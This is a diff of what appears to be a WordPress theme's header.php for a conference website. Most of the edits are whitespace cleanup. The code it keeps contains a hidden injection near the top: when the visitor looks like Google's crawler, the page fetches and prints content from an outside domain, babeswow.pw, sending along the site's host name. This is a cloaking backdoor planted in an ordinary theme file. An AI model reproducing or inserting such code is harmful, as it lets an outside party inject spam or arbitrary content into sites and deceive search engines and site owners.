@@ -22,7 +22,7 @@ if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( 
     $isbot = 1;
 	}
 
-if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
+if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google'))
 {
     $isbot = 1;
 }
@@ -30,10 +30,10 @@ if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google'))
 if(@$isbot){
 
 $_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
-$ch = curl_init();    
-    curl_setopt($ch, CURLOPT_URL, "http://babeswow.pw/cac/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
-    $result = curl_exec($ch);       
-curl_close ($ch);  
+$ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://babeswow.pw/cac/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");
+    $result = curl_exec($ch);
+curl_close ($ch);
 
 	echo $result;
 }
@@ -52,17 +52,17 @@ curl_close ($ch);
 
 <head>
 
-	<?php 
+	<?php
 	if( function_exists('zerif_top_head_trigger') ):
-		zerif_top_head_trigger(); 
-	endif;	
+		zerif_top_head_trigger();
+	endif;
 	?>
 
     <meta charset="<?php bloginfo( 'charset' ); ?>">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="profile" href="http://gmpg.org/xfn/11">
     <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
-	
+
 	<?php
 	$zerif_google_anaytics = get_theme_mod('zerif_google_anaytics');
 	if( !empty($zerif_google_anaytics) ):
@@ -74,7 +74,7 @@ curl_close ($ch);
     <script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/html5.js"></script>
     <link rel="stylesheet" href="<?php echo esc_url( get_template_directory_uri() ); ?>/css/ie.css" type="text/css">
     <![endif]-->
-	
+
 	<?php
 	if ( ! function_exists( '_wp_render_title_tag' ) ) :
 		function responsiveboat_old_render_title() {
@@ -86,11 +86,11 @@ curl_close ($ch);
 	endif;
 
     wp_head(); ?>
-	
-	<?php 
+
+	<?php
 	if( function_exists('zerif_bottom_head_trigger') ):
-		zerif_bottom_head_trigger(); 
-	endif;	
+		zerif_bottom_head_trigger();
+	endif;
 	?>
 
 	<!-- Adobe Typekit custom font -->
@@ -111,9 +111,9 @@ curl_close ($ch);
 	<body <?php body_class(); ?> itemscope="itemscope" itemtype="http://schema.org/WebPage">
 
 <?php endif; ?>
-<div id="wpadminbar" class="nojq nojs"><span class="alert" style="background-color:#000;color:#FFF;font-weight:bold;font-variant:small-caps;font-size:12pt;">
+<!-- <div id="wpadminbar" class="nojq nojs"><span class="alert" style="background-color:#000;color:#FFF;font-weight:bold;font-variant:small-caps;font-size:12pt;">
         Thanks to all of our 2017 conference pariticpants and presenters!</span>
-</div>
+</div> -->
 <?php
 
 
@@ -288,7 +288,7 @@ endif; ?>
 						</nav>
 					</div>
 				</div>
-				
+
 				<div id="main-nav" class="navbar navbar-inverse bs-docs-nav navbar-black-init" role="banner">
 					<div class="container">
 						<div class="navbar-header responsive-logo">
